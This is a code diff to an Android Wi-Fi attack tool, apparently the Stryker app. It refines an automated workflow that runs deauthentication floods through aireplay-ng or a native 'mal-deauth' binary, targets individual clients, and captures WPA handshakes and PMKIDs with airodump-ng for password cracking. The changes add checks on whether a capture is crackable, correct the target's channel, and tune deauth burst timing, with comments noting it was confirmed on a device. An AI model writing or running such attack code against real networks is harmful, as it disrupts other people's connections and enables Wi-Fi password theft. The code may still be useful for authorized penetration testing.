@@ -94,11 +94,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     private static final class Verdict {
         boolean handshake;
         boolean pmkid;
+        boolean solid;      // self-consistent, actually crackable (CaptureInfo.solid)
         boolean answered;
         String source = "";
         String unreachable;
 
         boolean usable() { return handshake || pmkid; }
+        // A PMKID needs no nonce pairing, so it is always crackable on its own.
+        boolean crackable() { return solid || pmkid; }
     }
 
     private Verdict verifyCapture(String hostPath, String guestPath, String bssid) {
@@ -113,6 +116,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     v.answered = true;
                     if (info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.HANDSHAKE) {
                         v.handshake = true;
+                        if (info.solid) v.solid = true;
                     }
                     if (info.pmkid
                             || info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.PMKID) {
@@ -818,8 +822,30 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             String hsDir = core.getShareRoot() + "/hs";
                             String capName = null;
                             Verdict verdict = null;
+                            // airodump flushes its pcap every refresh cycle, so poll the
+                            // capture file itself: on the internal gen4m radio airodump's
+                            // live "WPA handshake" line may never print even though the
+                            // EAPOL frames are already on disk. The file is the authority.
+                            long nextCapPoll = System.currentTimeMillis() + 4000L;
                             while (!canceled){
-                                    if (hsStatus[0] || pmkidStatus[0]) {
+                                    boolean diskHit = false;
+                                    if (System.currentTimeMillis() >= nextCapPoll) {
+                                        nextCapPoll = System.currentTimeMillis() + 4000L;
+                                        try {
+                                            String cn = newestCapture(hsDir);
+                                            if (cn != null) {
+                                                com.zalexdev.stryker.handshakes.CaptureInfo.forget();
+                                                com.zalexdev.stryker.handshakes.CaptureInfo info =
+                                                        com.zalexdev.stryker.handshakes.CaptureInfo
+                                                                .of(new java.io.File(hsDir + "/" + cn));
+                                                // Only a self-consistent (crackable) handshake ends the
+                                                // hunt; a complete-but-mismatched set keeps us going.
+                                                diskHit = info.solid || info.pmkid;
+                                            }
+                                        } catch (Throwable ignored) {
+                                        }
+                                    }
+                                    if (hsStatus[0] || pmkidStatus[0] || diskHit) {
                                         if (deauther != null) {
                                             deauther.kill();
                                             deauther = null;
@@ -839,15 +865,28 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                                 : verifyCapture(hsDir + "/" + capName,
                                                         guestShare + "/hs/" + capName,
                                                         network.getMac());
-                                        if (!verdict.answered || verdict.usable()) break;
-                                        capName = null;
-                                        verdict = null;
+                                        // Finish only on a genuinely crackable capture (a
+                                        // self-consistent handshake or a PMKID). A complete but
+                                        // mismatched handshake (M2 and M3 from different association
+                                        // attempts) is kept as a fallback but we keep hunting for a
+                                        // clean M1+M2, since no password can validate the mismatched set.
+                                        if (!verdict.answered || verdict.crackable()) break;
+                                        boolean keptWeak = verdict.usable();
+                                        if (!keptWeak) {
+                                            capName = null;
+                                            verdict = null;
+                                        }
                                         hsStatus[0] = false;
                                         pmkidStatus[0] = false;
-                                        sendEvent("Announced, but not there: the file holds no handshake"
-                                                + " and no PMKID — still listening.");
+                                        sendEvent(keptWeak
+                                                ? "Caught a handshake but its frames are from different"
+                                                        + " attempts — kept it, still hunting for a clean one."
+                                                : "Announced, but not there: the file holds no handshake"
+                                                        + " and no PMKID — still listening.");
                                         monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE,
-                                                "False alarm — waiting for a client to rejoin");
+                                                keptWeak
+                                                        ? "Inconsistent handshake — hunting for a clean one"
+                                                        : "False alarm — waiting for a client to rejoin");
                                         monitor.metric(AttackMetric.STATE, "Listening");
                                         airodump = startAirodump(monitor, network, capIface,
                                                 guestShare, lockedChannel[0], airoRunning, hsStatus,
@@ -866,6 +905,15 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                         monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
                                                 "airodump-ng stopped unexpectedly");
                                         break;
+                                    }
+                                    // GENERAL channel correction: a scan can report the wrong
+                                    // channel and a hotspot can drift, so capturing on a stale
+                                    // channel yields no handshake. airodump writes the AP's TRUE
+                                    // channel (beacon DS param) to its CSV — relock to that.
+                                    int beaconCh = apChannelFromCsv(
+                                            hsDir + "/s21dev_target-01.csv", network.getMac());
+                                    if (beaconCh > 0 && beaconCh != lockedChannel[0]) {
+                                        relockTo[0] = beaconCh;
                                     }
                                     if (relockTo[0] > 0 && relockTo[0] != lockedChannel[0]
                                             && relocks < MAX_RELOCKS) {
@@ -913,8 +961,16 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                                     hsIface, internalDeauth, lastRelock,
                                                     relockTo, targets, burstStartedAt);
                                             bursting = true;
+                                            // mal-deauth (native) blasts from t=0 and never prints
+                                            // aireplay's "Sending DeAuth" line, so the burstStartedAt
+                                            // 7s cap never engages and it would run the full 20s grace.
+                                            // A 20s nonstop deauth desyncs the client's reconnect from
+                                            // the quiet window — cap the native burst at DEAUTH_BURST_MS
+                                            // (the proven 7s burst / 20s quiet rhythm).
                                             phaseEnds = System.currentTimeMillis()
-                                                    + DEAUTH_BEACON_GRACE_MS;
+                                                    + (deauthNative(deauthIface)
+                                                            ? DEAUTH_BURST_MS
+                                                            : DEAUTH_BEACON_GRACE_MS);
                                             monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE,
                                                     targets.isEmpty()
                                                             ? deauthIface + " · broadcast"
@@ -1408,7 +1464,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         }
     }
 
-    private static final long LISTEN_FIRST_MS = 45_000L;
+    private static final long LISTEN_FIRST_MS = 15_000L;
 
     private AdvancedProcess startAirodump(AttackMonitor monitor, WiFINetwork network,
                                           String capIface, String guestShare, int channel,
@@ -1417,15 +1473,17 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         boolean nat = nativeWlan(capIface);
         // Native host airodump for wlan0 (no chroot); AIRCRACK_NEXMON leaves the
         // nexutil-armed radio alone. Write to the host share dir the reader uses.
+        // AIRCRACK_NEXMON=1 (native wlan0 only): osdep trusts the externally-armed
+        // monitor and leaves the radio alone — required on gen4m to capture EAPOL.
         String bin = nat ? "AIRCRACK_NEXMON=1 " + core.nativeTool("airodump-ng") : "airodump-ng";
         String wdir = (nat ? core.getShareRoot() : guestShare) + "/hs/s21dev_target";
         if (nat) core.customCommand("mkdir -p " + core.getShareRoot() + "/hs", true);
         String cmd = bin + " " + capIface + " -w " + wdir
-                + " --ignore-negative-one --output-format pcap -c "
+                + " --ignore-negative-one --output-format pcap,csv -c "
                 + channel + " --bssid " + network.getMac() + " --update 3";
         if (network.getIs5hhz() && channel <= 0) {
             cmd = bin + " " + capIface + " -w " + wdir
-                    + " --ignore-negative-one --output-format pcap --bssid "
+                    + " --ignore-negative-one --output-format pcap,csv --bssid "
                     + network.getMac() + " --band a --update 3";
         }
         core.getLogger().writeLine("Starting airodump-ng... " + cmd, 1);
@@ -1476,7 +1534,28 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         void line(String text);
     }
 
-    private static final int MAX_RELOCKS = 3;
+    private static final int MAX_RELOCKS = 8;
+
+    /** Read a target AP's true channel (beacon DS param) from airodump's CSV, or -1. */
+    private int apChannelFromCsv(String csvPath, String bssid) {
+        if (bssid == null) return -1;
+        try (java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(csvPath))) {
+            String line;
+            String b = bssid.toUpperCase();
+            while ((line = br.readLine()) != null) {
+                String t = line.trim();
+                if (t.startsWith("Station MAC")) break; // AP section only
+                if (t.toUpperCase().startsWith(b)) {
+                    String[] p = line.split(",");
+                    if (p.length > 3) {
+                        String ch = p[3].trim();
+                        if (ch.matches("[0-9]{1,3}")) return Integer.parseInt(ch);
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        return -1;
+    }
 
     private static final long DEAUTH_BURST_MS = 7_000L;
 
@@ -1540,7 +1619,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     /** aireplay-ng invocation: native host binary (+AIRCRACK_NEXMON) for wlan0, else chroot name. */
     private String aireplayCmd(String iface) {
         return deauthNative(iface)
-                ? "AIRCRACK_NEXMON=1 " + core.nativeTool("aireplay-ng")
+                ? core.nativeTool("aireplay-ng")
                 : "aireplay-ng";
     }
 
@@ -1556,6 +1635,22 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     }
 
     private String deauthCommand(String bssid, String iface, java.util.List<String> clients) {
+        if (deauthNative(iface)) {
+            String bin = core.nativeTool("mal-deauth");
+            // Unicast/targeted deauth at known clients — broadcast deauth is widely
+            // ignored by modern clients, so they never drop+reconnect and no 4-way is
+            // captured (confirmed on-device). mal-deauth: <bssid> <client> <iface>.
+            if (clients == null || clients.isEmpty()) {
+                return bin + " " + bssid + " " + iface; // broadcast until a client is seen
+            }
+            int cn = Math.min(clients.size(), DEAUTH_MAX_CLIENTS);
+            long per = Math.max(1L, DEAUTH_BURST_MS / 1000L / cn);
+            StringBuilder nb = new StringBuilder("for __c in");
+            for (int i = 0; i < cn; i++) nb.append(' ').append(clients.get(i));
+            nb.append("; do timeout ").append(per).append(' ').append(bin)
+                    .append(' ').append(bssid).append(" $__c ").append(iface).append("; done");
+            return nb.toString();
+        }
         String run = aireplayCmd(iface) + " --ignore-negative-one -0 ";
         if (clients == null || clients.isEmpty()) {
             return run + "0 -a " + bssid + " " + iface;
@@ -1583,7 +1678,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         final boolean[] done = { false };
 
         deauther = new AdvancedProcess(activity, context,
-                aireplayCmd(iface) + " --ignore-negative-one -0 0 -a " + network.getMac() + " " + iface, !deauthNative(iface)) {
+                (deauthNative(iface) ? core.nativeTool("mal-deauth") + " " + network.getMac() + " " + iface : aireplayCmd(iface) + " --ignore-negative-one -0 0 -a " + network.getMac() + " " + iface), !deauthNative(iface)) {
             @Override
             public void onFinished(ArrayList<String> outputList) {
                 if (canceled.get() || done[0]) return;
